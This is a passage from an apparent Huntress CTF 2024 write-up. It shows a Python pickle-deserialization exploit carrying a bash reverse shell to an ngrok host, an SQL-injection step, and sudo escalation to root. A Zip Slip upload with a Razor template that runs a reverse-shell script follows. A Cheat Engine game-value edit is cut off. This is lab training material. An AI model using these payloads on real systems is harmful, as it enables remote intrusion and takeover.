</span></span><span class="line"><span class="cl"><span class="c1">#  </span>
</span></span><span class="line"><span class="cl"><span class="c1"># Pickle deserialization RCE exploit  </span>
</span></span><span class="line"><span class="cl"><span class="c1"># calfcrusher@inventati.org  </span>
</span></span><span class="line"><span class="cl"><span class="c1">#  </span>
</span></span><span class="line"><span class="cl"><span class="c1"># Usage: ./Pickle-PoC.py [URL]  </span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>  
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>  
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>  
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PickleRCE</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>  
</span></span><span class="line"><span class="cl">   <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
</span></span><span class="line"><span class="cl">       <span class="kn">import</span> <span class="nn">os</span>  
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="n">command</span><span class="p">,))</span>  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="n">default_url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:5000/vulnerable&#39;</span>  
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">default_url</span>  
</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/2.tcp.ngrok.io/11707 0&gt;&amp;1&#34;&#39;</span>  <span class="c1"># Reverse Shell Payload Change IP/PORT  </span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="n">pickled</span> <span class="o">=</span> <span class="s1">&#39;pickled&#39;</span>  <span class="c1"># This is the POST parameter of our vulnerable Flask app  </span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">PickleRCE</span><span class="p">()))</span>  <span class="c1"># Crafting Payload  </span>
</span></span><span class="line"><span class="cl"><span class="c1">#print(url, data={pickled: payload})  # Sending POST request  </span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Running the script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python rce.py    
</span></span><span class="line"><span class="cl">b&#39;gASVVwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDwvYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMi50Y3Aubmdyb2suaW8vMTE3MDcgMD4mMSKUhZRSlC4=&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Inserting the pickle:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a\;/**/INSERT/**/INTO/**/files/**/SELECT/**/\rce\,/**/\gASVVwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDwvYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMi50Y3Aubmdyb2suaW8vMTE3MDcgMD4mMSKUhZRSlC4=\,/**/\1\--
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, executing the pickle load:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">games</span><span class="p">:</span><span class="mi">32291</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">rce</span><span class="o">/</span><span class="mi">1</span> <span class="o">-</span><span class="n">v</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">Host</span> <span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">games</span><span class="p">:</span><span class="mi">32291</span> <span class="n">was</span> <span class="n">resolved</span><span class="o">.</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">IPv6</span><span class="p">:</span> <span class="p">(</span><span class="n">none</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">IPv4</span><span class="p">:</span> <span class="mf">35.193</span><span class="o">.</span><span class="mf">148.143</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span>   <span class="n">Trying</span> <span class="mf">35.193</span><span class="o">.</span><span class="mf">148.143</span><span class="p">:</span><span class="mf">32291.</span><span class="o">..</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">Connected</span> <span class="n">to</span> <span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">games</span> <span class="p">(</span><span class="mf">35.193</span><span class="o">.</span><span class="mf">148.143</span><span class="p">)</span> <span class="n">port</span> <span class="mi">32291</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">using</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.</span><span class="n">x</span>  
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">GET</span> <span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">rce</span><span class="o">/</span><span class="mi">1</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>  
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">Host</span><span class="p">:</span> <span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">games</span><span class="p">:</span><span class="mi">32291</span>  
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">curl</span><span class="o">/</span><span class="mf">8.10</span><span class="o">.</span><span class="mi">1</span>  
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>  
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">Request</span> <span class="n">completely</span> <span class="n">sent</span> <span class="n">off</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Meanwhile, on the <code>nc</code> listener I get a connection.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/huntressctf]
</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8080
</span></span><span class="line"><span class="cl">listening on [any] 8080 ...
</span></span><span class="line"><span class="cl">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54558
</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (9): Inappropriate ioctl for device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">moveable@moveable-e62c7d47abb4b38d-66659f8889-wmgjg:~$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=1000(moveable) gid=1000(moveable) groups=1000(moveable)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Even now, we are not done as we have to elevate our privileges as described in the prompt.</p>
<p>Fortunately, we can run any command as sudo:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">moveable@moveable-e62c7d47abb4b38d-66659f8889-wmgjg:~$ sudo -l
</span></span><span class="line"><span class="cl">sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for moveable on
</span></span><span class="line"><span class="cl">    moveable-e62c7d47abb4b38d-66659f8889-wmgjg:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User moveable may run the following commands on
</span></span><span class="line"><span class="cl">        moveable-e62c7d47abb4b38d-66659f8889-wmgjg:
</span></span><span class="line"><span class="cl">    (root) NOPASSWD: ALL
</span></span></code></pre></td></tr></table>
</div>
</div><p>Executing sudo su:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">moveable@moveable-e62c7d47abb4b38d-66659f8889-wmgjg:~$ sudo su
</span></span><span class="line"><span class="cl">sudo su
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span><span class="line"><span class="cl">cat /root/flag.txt
</span></span><span class="line"><span class="cl">flag{ac53cd7aa8a2d1b2340a6eb4a356709e}
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="zippy">Zippy
</h3><blockquote>
<p>Need a quick solution for archiving your business files? Try Zippy today, the Zip Archiver built for the small to medium business!<br>
NOTE: This challenge may take <em>up to two minutes</em> or so to completely start and load in your browser. Please wait.</p>
<p>Author: @HuskyHacks</p>
</blockquote>
<p>Here we have an archive unzipper:</p>
<p><img src="/post/huntress-ctf-2024/Images/Zippy_Landingpage.png"
	width="1000"
	height="637"
	srcset="/post/huntress-ctf-2024/Images/Zippy_Landingpage_hu6516445285142572445.png 480w, /post/huntress-ctf-2024/Images/Zippy_Landingpage_hu1685519745559436593.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="376px"
	
></p>
<p>A really important note on their About page, <strong>Now with runtime compilation!</strong></p>
<p><img src="/post/huntress-ctf-2024/Images/Zippy_About.png"
	width="645"
	height="459"
	srcset="/post/huntress-ctf-2024/Images/Zippy_About_hu4165877070255028132.png 480w, /post/huntress-ctf-2024/Images/Zippy_About_hu16733055978220571904.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="140"
		data-flex-basis="337px"
	
></p>
<p>On the <code>Browse</code> page, we can view any folder but cannot access files. If we check the main app folder, we see an interesting naming motif:</p>
<p><img src="/post/huntress-ctf-2024/Images/Zippy_App.png"
	width="596"
	height="730"
	srcset="/post/huntress-ctf-2024/Images/Zippy_App_hu13326166829345303422.png 480w, /post/huntress-ctf-2024/Images/Zippy_App_hu5000705334985125433.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="81"
		data-flex-basis="195px"
	
></p>
<p>It&rsquo;s looking like a <a class="link" href="https://www.sonarsource.com/blog/openrefine-zip-slip/"  target="_blank" rel="noopener"
    >Zip Slip</a> attack, and with the names Zippy and Slippy being used it&rsquo;s a pretty on-the-nose hint. We can create our own malicious archives using <a class="link" href="https://github.com/ptoomey3/evilarc/tree/master"  target="_blank" rel="noopener"
    >evilarc</a>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python slipper.py ./test.txt -d 4 -o unix -p /app/wwwroot/  
</span></span><span class="line"><span class="cl">Creating evil.zip containing ../../../..//app/wwwroot/test.txt  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ls -al evil.zip    
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 spencer spencer 171 Nov  2 12:41 evil.zip
</span></span></code></pre></td></tr></table>
</div>
</div><p>After uploading it, we can find <code>test.txt</code> in the wwwroot!</p>
<p><img src="/post/huntress-ctf-2024/Images/Zippy_Test.png"
	width="617"
	height="392"
	srcset="/post/huntress-ctf-2024/Images/Zippy_Test_hu7858363888925255414.png 480w, /post/huntress-ctf-2024/Images/Zippy_Test_hu8214408297783816191.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="157"
		data-flex-basis="377px"
	
></p>
<p>I spent a long time throwing files in random locations with very little success. Unfortunately, this is not php based nor on a Windows machine so I had a lot of trouble creating a kind of accessible webshell.</p>
<p>Eventually the &ldquo;Now with runtime compilation&rdquo; note came to mind, and I found <a class="link" href="https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-%28SSTI%29-in-ASP.NET-Razor/"  target="_blank" rel="noopener"
    >articles on SSTI in asp.net Razor</a>. I had ChatGPT create a template to replace their About.cshtml page:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@page  
</span></span><span class="line"><span class="cl">@model AboutModel  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;  
</span></span><span class="line"><span class="cl">&lt;html lang=&#34;en&#34;&gt;  
</span></span><span class="line"><span class="cl">&lt;head&gt;  
</span></span><span class="line"><span class="cl">   &lt;meta charset=&#34;UTF-8&#34;&gt;  
</span></span><span class="line"><span class="cl">   &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;  
</span></span><span class="line"><span class="cl">   &lt;title&gt;My Example Page&lt;/title&gt;  
</span></span><span class="line"><span class="cl">   &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/css/bootstrap.min.css&#34;&gt;  
</span></span><span class="line"><span class="cl">&lt;/head&gt;  
</span></span><span class="line"><span class="cl">&lt;body&gt;  
</span></span><span class="line"><span class="cl">   &lt;div class=&#34;container mt-5&#34;&gt;  
</span></span><span class="line"><span class="cl">       &lt;h1&gt;My Example Page&lt;/h1&gt;  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">       &lt;form method=&#34;post&#34; asp-action=&#34;AddItem&#34;&gt;  
</span></span><span class="line"><span class="cl">           &lt;div class=&#34;mb-3&#34;&gt;  
</span></span><span class="line"><span class="cl">               &lt;label for=&#34;item&#34; class=&#34;form-label&#34;&gt;Add a New Item&lt;/label&gt;  
</span></span><span class="line"><span class="cl">               &lt;input type=&#34;text&#34; id=&#34;item&#34; name=&#34;item&#34; class=&#34;form-control&#34; required /&gt;  
</span></span><span class="line"><span class="cl">           &lt;/div&gt;  
</span></span><span class="line"><span class="cl">           &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary&#34;&gt;Add Item&lt;/button&gt;  
</span></span><span class="line"><span class="cl">       &lt;/form&gt;  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">       &lt;h2 class=&#34;mt-4&#34;&gt;Items List&lt;/h2&gt;  
</span></span><span class="line"><span class="cl">       &lt;ul class=&#34;list-group&#34;&gt;  
</span></span><span class="line"><span class="cl">       &lt;/ul&gt;  
</span></span><span class="line"><span class="cl">   &lt;/div&gt;  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">   &lt;script src=&#34;https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt;  
</span></span><span class="line"><span class="cl">&lt;/body&gt;  
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now replacing the About.cshtml:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python slipper.py ./About.cshtml -d 4 -o unix -p /app/Pages  
</span></span><span class="line"><span class="cl">Creating evil.zip containing ../../../..//app/Pages/About.cshtml
</span></span></code></pre></td></tr></table>
</div>
</div><p>Visiting the page:</p>
<p><img src="/post/huntress-ctf-2024/Images/Zippy_ExampleAbout.png"
	width="735"
	height="541"
	srcset="/post/huntress-ctf-2024/Images/Zippy_ExampleAbout_hu13617350496761693902.png 480w, /post/huntress-ctf-2024/Images/Zippy_ExampleAbout_hu11514121748556821782.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="135"
		data-flex-basis="326px"
	
></p>
<p>Now we can start inserting our malicious code to the <code>About.cshml</code>. After a bit of trial and error, I end up with a successful 2 step write-run of a reverse shell. First, upload a reverse shell in <code>r.sh</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat r.sh    
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash  </span>
</span></span><span class="line"><span class="cl">/bin/bash -i &gt;<span class="p">&amp;</span> /dev/tcp/2.tcp.ngrok.io/17321 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>You can zip-slip this or not, it really doesn&rsquo;t matter where it goes as long as you define the full path in <code>About.cshtml</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python slipper.py ./r.sh -d 4 -o unix -p /app/Pages  
</span></span><span class="line"><span class="cl">Creating evil.zip containing ../../../..//app/Pages/r.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Confirming the upload:
<img src="/post/huntress-ctf-2024/Images/Zippy_rev1.png"
	width="438"
	height="566"
	srcset="/post/huntress-ctf-2024/Images/Zippy_rev1_hu5487814383542444978.png 480w, /post/huntress-ctf-2024/Images/Zippy_rev1_hu5591932554530492740.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="77"
		data-flex-basis="185px"
	
></p>
<p>Now, we upload an About.cshtml file that executes the reverse shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@page  
</span></span><span class="line"><span class="cl">@model AboutModel  
</span></span><span class="line"><span class="cl">@System.Diagnostics.Process.Start(&#34;/app/Pages/r.sh&#34;,&#34;a&#34;)  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;  
</span></span><span class="line"><span class="cl">&lt;html lang=&#34;en&#34;&gt;
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Upload this the same way, and now whenever we visit About we get a reverse shell!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/huntressctf]
</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8080                      
</span></span><span class="line"><span class="cl">listening on [any] 8080 ...
</span></span><span class="line"><span class="cl">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45026
</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (1): Inappropriate ioctl for device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">root@zippy-96a0d6c8c74cd74f-67cd7dff49-8cfm5:/app# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span><span class="line"><span class="cl">root@zippy-96a0d6c8c74cd74f-67cd7dff49-8cfm5:/app# cat flag.txt
</span></span><span class="line"><span class="cl">cat flag.txt
</span></span><span class="line"><span class="cl">flag{a074eb7973c4c718790baefc096654dd}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="reverse-engineering">Reverse Engineering
</h2><h3 id="knights-quest">Knight&rsquo;s Quest
</h3><blockquote>
<p>An adventurer is YOU! Play Knight&rsquo;s Quest, beat the three monsters, and claim the flag! Very straightforward with no surprises, no sir-ee, no surprises here lmao</p>
<p>Author: @HuskyHacks</p>
</blockquote>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuest_Landingpage.png"
	width="826"
	height="709"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuest_Landingpage_hu7312939701799877738.png 480w, /post/huntress-ctf-2024/Images/KnightsQuest_Landingpage_hu11617300556621216415.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="116"
		data-flex-basis="279px"
	
></p>
<p>A game in the Reverse Engineering category surely needs <em>extra assistance</em> to pass. <a class="link" href="https://www.cheatengine.org/"  target="_blank" rel="noopener"
    >CheatEngine</a> is my go-to for editing game values in real time, although if you&rsquo;re a wizard you might be able to do something in <code>gdb</code> or other command-line tools.</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestFight1.png"
	width="773"
	height="558"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestFight1_hu14279324591011188738.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestFight1_hu1913254942453155753.png 1024w"
	loading="lazy"
	
		alt="First few commands"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="332px"
	
></p>
<p>It looks like icons aren&rsquo;t showing properly for me, but we see life values at XX/99, presumably attack value at 10 and defense value at 50. Since the life value is changing on every turn, it is pretty easy to identify this value in Cheat Engine. First search for the current value, 94:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestCheat1.png"
	width="577"
	height="304"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestCheat1_hu5676668099075573668.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestCheat1_hu2199326193917918047.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="189"
		data-flex-basis="455px"
	
></p>
<p>Attack again, and hp is now 89:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestFight2.png"
	width="697"
	height="276"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestFight2_hu14913958146200978419.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestFight2_hu10628489398168568493.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="606px"
	
></p>
<p>Use &ldquo;Next Scan&rdquo; on new hp value, 89:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestCheat2.png"
	width="548"
	height="238"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestCheat2_hu16436147005757841122.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestCheat2_hu10386274147420228518.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="230"
		data-flex-basis="552px"
	
></p>
<p>From this point there are only a few values we can check 1 by 1. Adding all of them to our table, we can start by editing the top value to <code>9999</code>:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestCheat3.png"
	width="516"
	height="200"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestCheat3_hu3222557365324823746.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestCheat3_hu16173082270621228657.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="258"
		data-flex-basis="619px"
	
></p>
<p>We need to refresh the game display by running another attack</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestFight3.png"
	width="681"
	height="273"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestFight3_hu3130484352725675357.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestFight3_hu223649230801605197.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="598px"
	
></p>
<p>We didn&rsquo;t lose HP, but this may be due to the enemy spider dying. As we don&rsquo;t see our hp value at 9999, I&rsquo;m inclined to believe this is not the HP value. Moving to the 2nd:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestCheat4.png"
	width="535"
	height="180"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestCheat4_hu2734231416763887986.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestCheat4_hu6382517638424555533.png 1024w"
	loading="lazy"
	
		alt="Also worth noting, entry 3 and 4 have turned to very different values. Clearly these are not pointing to hp either."
	
	
		class="gallery-image" 
		data-flex-grow="297"
		data-flex-basis="713px"
	
></p>
<p>Making an attack:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestFight4.png"
	width="659"
	height="334"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestFight4_hu10825701314888280068.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestFight4_hu11625629343101499651.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="197"
		data-flex-basis="473px"
	
></p>
<p>Our HP continues to decrease. It looks like the lowest number is pointing to hp. We must check, so setting this value to 9999:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestCheat5.png"
	width="653"
	height="177"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestCheat5_hu8943072673642559580.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestCheat5_hu14540770386519265960.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="368"
		data-flex-basis="885px"
	
></p>
<p>And now we have a massive health pool!</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestFight5.png"
	width="676"
	height="321"
